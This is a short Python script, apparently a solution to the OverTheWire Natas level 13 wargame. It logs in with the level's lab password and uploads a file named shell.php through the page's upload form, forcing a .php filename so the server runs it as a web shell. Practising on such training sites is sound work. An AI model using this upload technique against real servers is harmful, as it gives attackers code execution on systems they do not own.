
import requests

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY' 

url = 'http://natas13.natas.labs.overthewire.org/' 

session = requests.Session()

shell_file = open('shell.php', 'rb')
response = session.post(url, files = {'uploadedfile' : shell_file}, data = { "filename": "shell.php", "MAX_FILE_SIZE" : 1000}, auth = (username, password))

print(response.text)
